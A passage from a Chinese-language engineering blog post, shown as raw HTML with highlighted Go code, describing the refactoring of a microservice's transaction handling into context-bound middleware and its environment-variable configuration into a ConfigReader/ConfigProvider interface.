&lt;span class="k">if&lt;/span> &lt;span class="nx">e&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">recover&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="nx">e&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 检查 panic
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nf">rollbackTxSet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">txSet&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 检查 error 返回值
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ErrorC&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;rollback due to error&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;err&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;recovered&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">e&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">rollbackTxSet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">txSet&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="nx">resp&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">reflect&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Indirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">reflect&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ValueOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">resp&lt;/span>&lt;span class="p">)).&lt;/span>&lt;span class="nf">FieldByName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Code&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nf">Int&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nx">errorcode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">RequestSuccess&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 检查响应 Code
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ErrorC&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;rollback due to response code&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;code&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">reflect&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Indirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">reflect&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ValueOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">resp&lt;/span>&lt;span class="p">)).&lt;/span>&lt;span class="nf">FieldByName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Code&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nf">Int&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="nf">rollbackTxSet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">txSet&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 没有错误，提交事务
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nf">commitTxSet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">txSet&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>考虑到旧的代码并不规范，所以一个 &lt;code>ctx&lt;/code> 是可以可以注入多个数据库和事务的，把事务绑定到上下文的工作只能在微服务代码下再单独写两个工具函数。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">GetBaseDB&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">sql&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DB&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">v&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">BaseDBKey&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">v&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">errors&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;no database found in context&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">v&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">txmanager&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">WrappedDB&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DB&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Errorf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;unexpected database type %T&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">v&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">GetTxForBaseDB&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">sql&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Tx&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">tx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">txmanager&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">LazyBeginTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">BaseDBKey&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">BaseTxKey&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">errors&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Wrap&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;get transaction for base db failed&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">tx&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">sql&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Tx&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如此一来，在业务代码里，原本的 &lt;code>DB.Query&lt;/code>只要改成&lt;code>GetBaseDB(ctx).Query&lt;/code>即可，影响降至最低。&lt;/p>
&lt;p>而原本涉及事务的代码，也可以简单地改写成：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="nx">tx&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nf">GetTxForBaseDB&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1">// ...业务代码
&lt;/span>&lt;span class="c1">// tx.ExecContext(ctx, query, args...)
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>原本复杂的&lt;code>defer&lt;/code>就可以直接省略了，&lt;code>sqlStmts&lt;/code>也可以去除，变成 &lt;code>tx.ExecContext()&lt;/code> ，读起来更清楚。&lt;/p>
&lt;h3 id="效果评估">效果评估&lt;/h3>
&lt;p>最明显的就是原本考虑不周的 &lt;code>defer&lt;/code> 里 &lt;code>Commit/Rollback&lt;/code> 被考虑更全面的中间件替代了，潜在的 &lt;code>panic&lt;/code>导致错误提交/回滚问题得到修正，相关代码去除后可读性有所改善。&lt;/p>
&lt;p>其次是有机会在这个基础上统一封装一个分布式事务，把侵入业务代码的可能降到比较低的水平。&lt;/p>
&lt;p>重构完还发现，利用数据库初始化从&lt;code>init&lt;/code>推迟到&lt;code>main&lt;/code>的改变，有机会对数据库做mock，可测试性也有改善。&lt;/p>
&lt;p>也看了下 jaeger 对请求耗时的分析，重构后的事务管理器增加的耗时不明显，不够成瓶颈，性能上也马马虎虎过得去。压测因为压力直接打到MySQL的原因没法做，QPS瓶颈很明显卡在数据库上，缺少缓存依然是致命短板。&lt;/p>
&lt;h2 id="配置管理重构">配置管理重构&lt;/h2>
&lt;h3 id="痛点-1">痛点&lt;/h3>
&lt;p>相信很多人写代码的时候习惯把第三方的服务的 key/secret 直接写成常量，然后用一个宏或者标志去控制用哪套配置，比如这样：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#ifdef PRODUCTION
&lt;/span>&lt;span class="cp"># define QINIU_AK &amp;#34;***ak***&amp;#34;
&lt;/span>&lt;span class="cp"># define QINIU_SK &amp;#34;***SK***&amp;#34;
&lt;/span>&lt;span class="cp">#elif defined(TESTING)
&lt;/span>&lt;span class="cp"># define QINIU_AK &amp;#34;***ak***&amp;#34;
&lt;/span>&lt;span class="cp"># define QINIU_SK &amp;#34;***SK***&amp;#34;
&lt;/span>&lt;span class="cp">#else
&lt;/span>&lt;span class="cp"># define QINIU_AK &amp;#34;***ak***&amp;#34;
&lt;/span>&lt;span class="cp"># define QINIU_SK &amp;#34;***SK***&amp;#34;
&lt;/span>&lt;span class="cp">#endif
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但这项目比较狗，选择用环境变量来配置。用环境变量也就算了，最大的问题是：不管什么东西都往环境变量里塞，所有微服务共用一套环境变量配置，结果环境变量配置足有一百多行，也不管谁在用，怎么用。&lt;/p>
&lt;p>这也就罢了&amp;hellip;&lt;/p>
&lt;p>更离谱的是，连推送文案，居然也写到环境变量里&amp;hellip;我寻思这玩意儿不得让运营人员编辑的吗&amp;hellip;&lt;/p>
&lt;p>在上一份工作里维护的项目就好得多，大部分配置放到了 etcd，比如第三方服务的ak/sk和一些业务配置，也做到了热重载，不需要开发/运维人员介入就能实时调很多东西。而现在的项目，属于是开发的时间不要钱，宁可随时 on call 也不安排写个配置编辑和热重载。&lt;/p>
&lt;p>而且还有个比较头疼的问题是，因为配置是环境变量，环境变量又由 kubernetes configmap 管理，kubernetes 配置又和源代码一起被 git 跟踪管理，所以即使是运营人员想改个推送文案，也要走开发的 hotpatch 流程，提交到 git 上，谁都不舒服。&lt;/p>
&lt;p>最终列出痛点如下：&lt;/p>
&lt;ul>
&lt;li>配置修改不便。&lt;/li>
&lt;li>不支持按需访问，存在误用滥用。&lt;/li>
&lt;li>从痛点2延伸出不可控问题，无关配置项配置问题也会导致服务初始化时 crash，倒逼所有服务共用一套环境变量。&lt;/li>
&lt;li>从痛点1延伸出不灵活问题，即使有修改不便的问题，也不支持更换配置源，存在强耦合。&lt;/li>
&lt;/ul>
&lt;h3 id="调研-1">调研&lt;/h3>
&lt;p>因为配置管理其实是一个和语言关系比较大的领域，配置读写的接口灵不灵活好不好用很大程度看语言有哪些奈斯的语法糖。&lt;/p>
&lt;p>比如 python 可以继承 &lt;code>UserDict&lt;/code> 等结构实现个同时支持&lt;code>.&lt;/code>语法和下标的配置对象，更高阶的还可以用 &lt;code>descriptor&lt;/code> 预先定义字段，检查/转换类型等等。&lt;/p>
&lt;p>再比如 C++ 就完全可以一套 &lt;code>template&lt;/code> 打天下，接口完全可以设计成 &lt;code>get&amp;lt;int&amp;gt;&lt;/code>、&lt;code>get&amp;lt;std::string&amp;gt;&lt;/code> 这样，也可以利用运算符重载实现 &lt;code>config[&amp;quot;http.port&amp;quot;]&lt;/code> 下标形式的访问，甚至再骚一点，结合一点宏和元编程，&lt;code>config-&amp;gt;http-&amp;gt;port&lt;/code> 也行。&lt;/p>
&lt;p>对 Go 这样的语言来说事情会更麻烦，一来是静态类型，堵死了一个&lt;code>Get&lt;/code>覆盖所有情况的路子。除非不介意 &lt;code>interface{}&lt;/code> 满天飞。二来泛型不成熟，同样堵死了像 C++ 那样一个 &lt;code>Get[T]&lt;/code> 打天下的路子。&lt;/p>
&lt;p>所以调研主要还是考虑有没有现成的轮子，能不能满足需要。&lt;/p>
&lt;h4 id="viper">viper&lt;/h4>
&lt;p>&lt;em>viper&lt;/em> 是一个相当流行的配置管理库，原本是为 &lt;em>cobra&lt;/em> （一个 cli 库）设计的。&lt;/p>
&lt;p>&lt;em>viper&lt;/em> 支持不少配置源，从配置文件（JSON、TOML、YAML、INI）到环境变量、远程配置（etcd、consul）都能支持，接口设计上也还算舒服（像是&lt;code>viper.GetString(key)&lt;/code>这样的用法），而且有个比较奈斯的热重载。缺憾是etcd暂时只支持到 v2，而且支持多种配置的方式是嵌入本体，导致 viper 仓库依赖很多。&lt;/p>
&lt;p>考虑到 viper 对付目前的需求有点 overkill，而且依赖有点偏多，决定是定义一套读配置接口，先自行实现基于环境变量的配置提供者，若有需要再把读配置接口的实现替换成 viper 。&lt;/p>
&lt;h3 id="方案-1">方案&lt;/h3>
&lt;p>鉴于当前项目中配置项是全局变量+&lt;code>func init&lt;/code>，替换成配置管理器解决修改不便+热重载的话需要把全局变量换成 &lt;code>sync.Map&lt;/code> 或者 &lt;code>GetXxx()&lt;/code> 。考虑到是读多写少的场景，&lt;code>sync.Map&lt;/code> 有点过，而且把全局变量替换成 &lt;code>config[&amp;quot;Xxx&amp;quot;]&lt;/code> 还会遇到类型问题。&lt;/p>
&lt;p>而&lt;code>GetString&lt;/code>这种形式的接口，又需要把配置名换成字符串，直接用环境变量当 key 的话又会碰到环境变量命名不好、其他配置源命名规则有区别等情况。从使用的角度来说，还是希望尽可能把对业务代码的影响降到最低，因此业务代码里最好还是 &lt;code>GetQiniuAK() string&lt;/code> 这样的接口最合适，内部实现可以是适配到 &lt;code>GetString(&amp;quot;QINIU_AK&amp;quot;)&lt;/code>。&lt;/p>
&lt;p>同样有部分痛点无法立即得到解决：&lt;/p>
&lt;ul>
&lt;li>误用滥用问题无法完全解决，需要进一步对配置项分析，提取出公共配置和独属于服务的配置。这也会造成新的问题：如何兼顾配置的中心化访问模式（保持&lt;code>config.GetXxx&lt;/code>这种足够简单清楚的访问方式，不会在业务代码里出现&lt;code>globalConfig&lt;/code>和&lt;code>privateConfig&lt;/code>两个配置源）和私有配置防误用滥用？&lt;/li>
&lt;/ul>
&lt;p>整体方案如下：&lt;/p>
&lt;ul>
&lt;li>原本的全局变量全部改成 &lt;code>GetXxx() &amp;lt;type&amp;gt;&lt;/code> 形式定义。&lt;/li>
&lt;li>实现一个&lt;code>config&lt;/code>包，定义&lt;code>ConfigReader&lt;/code>接口和初步实现，再给一个全局默认 &lt;code>ConfigReader&lt;/code> ，方便直接用 &lt;code>config.GetString(key)&lt;/code> 的形式读配置，降低使用门槛。&lt;code>ConfigReader&lt;/code>的实现内用一个标准&lt;code>map&lt;/code>和&lt;code>sync.RWMutex&lt;/code>管理配置项缓存，降低读操作的成本。&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">type&lt;/span> &lt;span class="nx">ConfigReader&lt;/span> &lt;span class="kd">interface&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">GetString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">GetInt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">GetInt32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int32&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">GetInt64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int64&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">GetUint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">GetUint32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint32&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">GetUint64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint64&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">GetFloat32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">float32&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">GetFloat64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">float64&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">GetBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">([]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">GetDuration&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Duration&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">GetBool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">bool&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">MustGetString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">string&lt;/span>
&lt;span class="nf">MustGetInt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">int&lt;/span>
&lt;span class="nf">MustGetInt32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">int32&lt;/span>
&lt;span class="nf">MustGetInt64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">int64&lt;/span>
&lt;span class="nf">MustGetUint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">uint&lt;/span>
&lt;span class="nf">MustGetUint32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">uint32&lt;/span>
&lt;span class="nf">MustGetUint64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">uint64&lt;/span>
&lt;span class="nf">MustGetFloat32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">float32&lt;/span>
&lt;span class="nf">MustGetFloat64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">float64&lt;/span>
&lt;span class="nf">MustGetBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>
&lt;span class="nf">MustGetDuration&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Duration&lt;/span>
&lt;span class="nf">MustGetBool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">bool&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>以及配置提供者：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">type&lt;/span> &lt;span class="nx">ConfigProvider&lt;/span> &lt;span class="kd">interface&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">Lookup&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">([]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">bool&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">Get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">([]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">Set&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">val&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span>
&lt;span class="nf">Delete&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span>
&lt;span class="c1">// is config provider support change detection
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nf">CanWatch&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">bool&lt;/span>
&lt;span class="c1">// Optional, implementation may return nil chan
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nf">Watch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="nx">Change&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最终指定 Provider 来创建 &lt;code>ConfigReader&lt;/code> 实例。&lt;/p>
&lt;p>这个方案存在一个比较麻烦的问题：原始的全局变量并不都是 &lt;code>string&lt;/code> 类型，而是夹杂了 &lt;code>int&lt;/code>、&lt;code>int64&lt;/code>、&lt;code>bool&lt;/code>，初始化时有的是用了封装好的 &lt;code>GetEnv&lt;/code> ，有的使用 &lt;code>os.Getenv()&lt;/code>、&lt;code>strconv.Atoi&lt;/code> 等。将原本的全局变量替换成 &lt;code>GetXxx&lt;/code> 并不是一件简单的事——如果手动来的话。&lt;/p>
&lt;p>幸好，Go 提供了 &lt;code>go/parser&lt;/code>，只需要写大概一两百行代码，处理下 &lt;code>GenDecl&lt;/code> 和 &lt;code>AssignStmt&lt;/code>，找出配置项，然后用 &lt;code>dave/jennifer&lt;/code> 生成对应的 Go 代码即可，最终生成 700多行代码，手工调整下部分结果就算完成了。&lt;/p>
&lt;p>至于业务代码中的调用点，可以直接在 vscode 里全局正则表达式搜索 &lt;code>\benv.(\w+)\b&lt;/code> 替换。&lt;/p>
&lt;p>至此，配置管理有了更多的可能。&lt;/p>
&lt;h3 id="效果评估-1">效果评估&lt;/h3>
&lt;ul>
&lt;li>以较低的成本实现了重构&lt;/li>
&lt;li>灵活性显著提高，有了迁移配置源到其他存储服务中的可能&lt;/li>
&lt;li>解决了其他服务的私有配置加载失败也会导致崩溃的问题&lt;/li>
&lt;li>尚未完全解决配置编辑不便的问题：对于配置迁移到 etcd/consul 等平台，还需要进一步调研选型、决定是改用 viper 还是自行在 etcd/consul driver 上实现一个 provider 。&lt;/li>
